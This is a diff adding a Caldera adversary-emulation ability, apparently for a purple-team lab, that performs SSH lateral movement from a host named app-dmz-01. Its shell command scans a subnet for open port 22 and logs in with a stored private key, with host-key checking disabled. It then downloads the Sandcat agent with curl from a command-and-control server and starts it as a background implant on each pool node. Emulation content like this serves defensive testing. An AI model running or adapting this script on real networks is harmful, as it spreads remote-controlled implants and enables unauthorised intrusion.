@@ -1,0 +1,40 @@
+- id: a1301098-0098-4098-8098-000000000098
+  name: ABL-S13-APPDMZ-DELIVER-POOL-AGENTS
+  description: From app-dmz-01, deploy Sandcat to every reachable pool-node host
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.004
+    name: SSH
+  platforms:
+    linux:
+      sh:
+        command: >
+          hostname | grep -qx app-dmz-01 || exit 0;
+          for host in $(seq 101 199 | awk '{print "10.10.50."$1}'); do
+            timeout 1 bash -lc "</dev/tcp/${host}/22" 2>/dev/null || continue;
+            NODE="$(ssh -i /opt/purple-web/.ssh/purplelab_support_ed25519 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=1 analyst@${host} hostname 2>/dev/null | tr -d '\r')";
+            echo "${NODE}" | grep -Eq '^pool-node-[0-9]+$' || continue;
+            if ssh -i /opt/purple-web/.ssh/purplelab_support_ed25519 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=1 analyst@${host} "BASE=/home/analyst/.caldera; BIN=\${BASE}/sandcat-${NODE}; LOG=\${BASE}/logs/sandcat-${NODE}.log; PIDFILE=\${BASE}/sandcat-${NODE}.pid; mkdir -p \${BASE}/logs || exit 1; curl -fsSL -X POST -H file:sandcat.go -H platform:linux http://192.168.56.10:8888/file/download -o \${BIN} >>\${LOG} 2>&1 || exit 1; chmod +x \${BIN} || exit 1; pkill -f \"\${BIN}\" >/dev/null 2>&1 || true; nohup \${BIN} -server http://192.168.56.10:8888 -group s13-flow -paw ${NODE} -v >>\${LOG} 2>&1 </dev/null & echo \$! > \${PIDFILE}; sleep 5; test -s \${PIDFILE} && kill -0 \$(cat \${PIDFILE})"; then
+              printf 'S13_DELIVERY_OK node=%s host=%s paw=%s\n' "${NODE}" "${host}" "${NODE}";
+            else
+              printf 'S13_DELIVERY_FAIL node=%s host=%s paw=%s\n' "${NODE}" "${host}" "${NODE}";
+            fi;
+          done
+        timeout: 240
+        parsers:
+          plugins.purplelab.app.parsers.s13_delivery:
+            - source: pool.compromised.host
+              edge: has_paw
+              target: pool.compromised.paw
+            - source: pool.compromised.host
+              edge: maps_name
+              target: pool.compromised.node
+  requirements:
+    - module: plugins.stockpile.app.requirements.basic
+      relationship_match:
+        - source: app.compromised.host
+          edge: has_paw
+          target: app.compromised.paw
+  singleton: false
+  repeatable: false
+  delete_payload: false
